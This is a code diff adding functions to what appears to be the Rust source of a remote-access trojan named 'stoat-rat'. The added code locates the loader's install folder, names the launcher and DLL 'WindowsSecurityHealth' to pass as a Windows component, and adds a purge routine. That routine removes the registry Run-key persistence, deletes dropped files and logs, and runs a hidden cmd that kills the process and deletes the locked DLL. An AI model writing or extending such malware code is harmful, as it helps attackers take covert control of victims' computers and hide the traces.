@@ -207,3 +207,70 @@ pub fn ensure_autostart(name: &str) -> Result<String> {
     key.set_value(name, &exe_s)?;
     Ok(exe_s)
 }
+
+/// Install directory the loader uses.
+fn install_dir() -> std::path::PathBuf {
+    std::env::var("RAT_DESTDIR")
+        .map(std::path::PathBuf::from)
+        .unwrap_or_else(|_| {
+            std::path::PathBuf::from(std::env::var("APPDATA").unwrap_or_default())
+                .join("Microsoft")
+                .join("Windows")
+        })
+}
+
+/// Remove the Run entry, launcher, scratch files and logs. The loaded DLL cannot be
+/// deleted while this process lives — it is returned so the caller can delete it on exit.
+/// Returns (run_key_status, removed_paths, dll_path).
+pub fn purge_install() -> (String, Vec<std::path::PathBuf>, std::path::PathBuf) {
+    let dir = install_dir();
+    let launcher_name =
+        std::env::var("RAT_NAME").unwrap_or_else(|_| "WindowsSecurityHealth.exe".into());
+    let dll_name =
+        std::env::var("RAT_DLLNAME").unwrap_or_else(|_| "WindowsSecurityHealth.dll".into());
+    let run_name = std::env::var("RAT_NAME").unwrap_or_else(|_| "WindowsSecurityHealth".into());
+
+    let run_status = match unpersist(&run_name) {
+        Ok(_) => "removed".to_string(),
+        Err(e) => format!("{e}"),
+    };
+
+    let dll = dir.join(&dll_name);
+    let mut removed = Vec::new();
+    for p in [
+        dir.join(&launcher_name),
+        dir.join(format!("{dll_name}.tmp")),
+        dir.join("stoat-rat.old"),
+        dir.join("stoat-rat.new"),
+        dir.join("stoat-rat.d"),
+        std::env::temp_dir().join("rat_drop.log"),
+        std::env::temp_dir().join("stoat-rat.log"),
+    ] {
+        if p.exists() {
+            match std::fs::remove_file(&p) {
+                Ok(()) => removed.push(p),
+                Err(e) => log_cleanup(&format!("could not remove {}: {e}", p.display())),
+            }
+        }
+    }
+    (run_status, removed, dll)
+}
+
+/// After this process exits, delete the (previously locked) DLL.
+pub fn schedule_self_cleanup(dll: &std::path::Path) {
+    let pid = std::process::id();
+    let cmd = format!(
+        "/C ping -n 3 127.0.0.1 >nul & taskkill /F /PID {pid} >nul 2>&1 & del /F /Q \"{}\"",
+        dll.display()
+    );
+    let _ = std::process::Command::new("cmd")
+        .raw_arg(cmd)
+        .creation_flags(CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP)
+        .spawn();
+}
+
+fn log_cleanup(msg: &str) {
+    if std::env::var_os("RAT_CONSOLE").is_some() {
+        eprintln!("[!] {msg}");
+    }
+}
